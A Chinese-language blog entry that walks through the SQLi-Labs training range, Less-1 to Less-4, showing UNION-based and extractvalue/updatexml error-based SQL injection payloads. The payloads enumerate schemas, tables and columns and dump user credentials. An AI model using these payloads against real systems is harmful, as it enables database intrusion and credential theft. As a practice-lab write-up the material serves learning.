    <entry>
      <title>SQLi-LABS Basic Challenges</title>
      <link href="/2020/04/12/SQLi-LABS%20Basic%20Challenges/"/>
      <url>/2020/04/12/SQLi-LABS%20Basic%20Challenges/</url>
      
        <content type="html"><![CDATA[<p>SQL注入需要掌握一些基本的SQL语句及系统表信息。SQLi-Labs系列是学习SQL注入一个不错的靶场，使用<a href="https://hub.docker.com/r/acgpiano/sqli-labs" target="_blank" rel="noopener">sqli-labs</a>镜像可以快速搭建靶场环境。每个Less都有多种不同注入的方式，可以循序渐进的加深对SQL注入的了解。</p><h1 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=<span class="string">'$id'</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span>;</span><br></pre></td></tr></table></figure><h2 id="UNION操作符"><a href="#UNION操作符" class="headerlink" title="UNION操作符"></a>UNION操作符</h2><div class="note info">            <p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。请注意，UNION 内部的每个 SELECT 语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT 语句中的列的顺序必须相同。</p>          </div><p>在页面提示下，传递id参数，输入<code>index.php？id=1</code>:</p><p><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less1_point.gif"  alt="less-1-injection-point"></p><p>输入<code>index.php?id=1&#39;</code> ，页面报错:<code>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;1&#39;&#39; LIMIT 0,1&#39; at line 1</code>,由此推断出源码的SQL语句可能是<code>select ... from ... where id=${id} limit 0,1</code>:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less1_limit.gif"  alt="less-1-limit"></p><p>使用union确认查询字段数量<code>index.php?id=1&#39; union select 1,2,3... -- d</code>,此处的<code>-- d</code>用于注释掉where条件后的<code>limit 0,1</code>，最终匹配到字段个数为3;<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less1_union_columns.gif"  alt="less-1-union"></p><div class="note info">            <p>爆库</p>          </div><p>使用<code>index.php?id=0&#39; union select 1,2,group_concat(SCHEMA_NAME) from information_schema.SCHEMATA -- dd</code>获取数据库名,此处<code>id=0</code>是为了显示后方查询结果：<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-database.png"  alt="less-1-database"></p><div class="note info">            <p>爆表</p>          </div><p>使用<code>union select 1,2,group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=&#39;security&#39; -- dd</code> 获取表:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-tables.png"  alt="less-1-tables"></p><div class="note info">            <p>爆字段</p>          </div><p>使用<code>union select 1,2,group_concat(column_name) from information_schema.columns where TABLE_NAME=&#39;users&#39; -- dd</code>获取字段名:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-columns.png"  alt="less-1-columns"></p><div class="note info">            <p>爆字段内容</p>          </div><p>使用 <code>index.php?id=0&#39; union select  1,group_concat(username),group_concat(password) from security.users   -- dd</code> 获取数据：<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-data.png"  alt="less-1-data"></p><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><div class="note info">            <p>报错型是利用执行函数或者语句错误的错误提示信息来获取payload信息。</p>          </div><p>输入<code>/index.php?id=1 &#39;  and 1=2 -- dd</code> 查看网站是否存在报错型注入,此处<code>and 1=2</code>条件不满足，说明网站存在报错型注入漏洞：<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-err.png"  alt="less-1-err"></p><h3 id="XML函数"><a href="#XML函数" class="headerlink" title="XML函数"></a>XML函数</h3><div class="note info">            <p>XML函数注入的原理是因为在Mysql中，如果XML函数执行错误，会显示XPATH的内容。（显示内容有长度限制）</p>          </div><h4 id="ExtractValue"><a href="#ExtractValue" class="headerlink" title="ExtractValue"></a>ExtractValue</h4><p>使用XPath表示法从XML string中提取 value。ExtractValue(xml_frag，xpath_expr)：xml_frag表示XML标记片段，xpath_expr表示<a href="https://www.w3school.com.cn/xpath/xpath_syntax.asp" target="_blank" rel="noopener">XPath 表达式</a>。</p><div class="note info">            <p>爆表</p>          </div><p>使用 <code>and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) -- dd</code>:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-extractvalue-table.png"  alt="less-1-extractvalue-table"></p><p>SQL语句中的<code>1</code>代表错误的XML片段；<code>0x7e</code>对应ASIIC码表中的<code>~</code>符号，因为XPATH语法报错的是那些特殊字符,遇到特殊字符就会报错。所以0x7e,ASCII码是~ 就会从头开始报错。</p><div class="note info">            <p>爆字段</p>          </div><p>使用 <code>and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;))) -- dd</code>：<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-extractvalue-columns.png"  alt="less-1-extractvalue-columns"></p><div class="note info">            <p>爆字段内容</p>          </div><p>使用 <code>and extractvalue(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)))-- dd</code>，由于错误限内容限制，此处内容显示不完整:</p><p><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-extractvalue-data.png"  alt="less-1-extractvalue-data"></p><h4 id="UpdateXML"><a href="#UpdateXML" class="headerlink" title="UpdateXML"></a>UpdateXML</h4><p>Return 替换的 XML 片段。UpdateXML(xml_target，xpath_expr，new_xml)：xml_target表示XML片段的部分，xpath_exprr表示XPath 表达式，new_xml表示替换的内容。</p><div class="note info">            <p>爆表</p>          </div><p>使用<code>and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database())),1) -- dd</code>:</p><p><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-updatexml-table.png"  alt="less-1-updatexml-table"></p><div class="note info">            <p>爆字段</p>          </div><p>使用<code>and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;)),1) -- dd</code>:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-updatexml-columns.png"  alt="less-1-updatexml-columns"></p><div class="note info">            <p>爆字段内容</p>          </div><p>使用<code>and updatexml(1,concat(0x7e,(select group_concat(username,0x3a,password) from users)),1) -- dd</code>:<br><img src="/" class="lazyload" data-src="https://andrewhawkeye.oss-cn-beijing.aliyuncs.com/Blog/penetration_testing/sqlinjection/Basic_Challenges/less1/less-1-updatexml-data.png"  alt="less-1-updatexml-data"></p><h1 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=$<span class="keyword">id</span> <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>与Less-1注入语句基本一致，将<code>id=1&#39;</code>更换为<code>id=1</code>即可，此处不在赘述。</p><h1 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">'$id'</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>与Less-1注入语句基本一致，将<code>id=1&#39;</code>更换为<code>id=1&#39;)</code>即可，此处不在赘述。</p><h1 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h1><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> <span class="keyword">id</span>=(<span class="string">"$id"</span>) <span class="keyword">LIMIT</span> <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>与Less-1注入语句基本一致，将<code>id=1&#39;</code>更换为<code>id=1&quot;)</code>即可，此处不在赘述。</p><h1 id="Less-5"><a href="#Less-5" class="headerlink" title="Less-5"></a>Less-5</h1>]]></content>
      
      
